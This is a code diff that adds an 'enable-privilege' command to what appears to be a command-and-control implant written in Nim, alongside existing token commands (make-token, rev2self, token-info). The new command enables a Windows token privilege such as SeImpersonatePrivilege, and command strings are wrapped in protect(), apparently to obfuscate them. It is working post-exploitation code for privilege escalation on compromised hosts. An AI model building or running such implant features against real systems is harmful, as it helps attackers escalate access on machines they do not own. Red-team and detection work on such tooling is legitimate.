@@ -4,6 +4,8 @@ import ../common/[types, utils]
 proc executeMakeToken(ctx: AgentCtx, task: Task): TaskResult 
 proc executeRev2Self(ctx: AgentCtx, task: Task): TaskResult 
 proc executeTokenInfo(ctx: AgentCtx, task: Task): TaskResult 
+proc executeEnablePrivilege(ctx: AgentCtx, task: Task): TaskResult 
+
 
 # Module definition
 let module* = Module(
@@ -38,6 +40,16 @@ let module* = Module(
             example: protect("token-info"),
             arguments: @[],
             execute: executeTokenInfo
+        ),
+        Command(
+            name: protect("enable-privilege"),
+            commandType: CMD_ENABLE_PRIV,
+            description: protect("enable a token privilege."),
+            example: protect("enable-privilege SeImpersonatePrivilege"),
+            arguments: @[
+                Argument(name: protect("privilege"), description: protect("Privilege to modify."), argumentType: STRING, isRequired: true)
+            ],
+            execute: executeEnablePrivilege
         )
     ]
 )  
@@ -47,6 +59,7 @@ when not defined(agent):
     proc executeMakeToken(ctx: AgentCtx, task: Task): TaskResult = nil
     proc executeRev2Self(ctx: AgentCtx, task: Task): TaskResult = nil
     proc executeTokenInfo(ctx: AgentCtx, task: Task): TaskResult = nil
+    proc executeEnablePrivilege(ctx: AgentCtx, task: Task): TaskResult = nil 
 
 when defined(agent):
 
@@ -98,6 +111,18 @@ when defined(agent):
 
             let tokenInfo = getCurrentToken().getTokenInfo() 
             return createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(tokenInfo))
+
+        except CatchableError as err: 
+            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
+
+    proc executeEnablePrivilege(ctx: AgentCtx, task: Task): TaskResult = 
+        try: 
+            echo fmt"   [>] Enabling token privilege."
+
+            let privilege = Bytes.toString(task.args[0].data)
+            let privilegeName = enablePrivilege(privilege) 
+
+            return createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(fmt"Enabled {privilegeName}."))
 
         except CatchableError as err: 
             return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
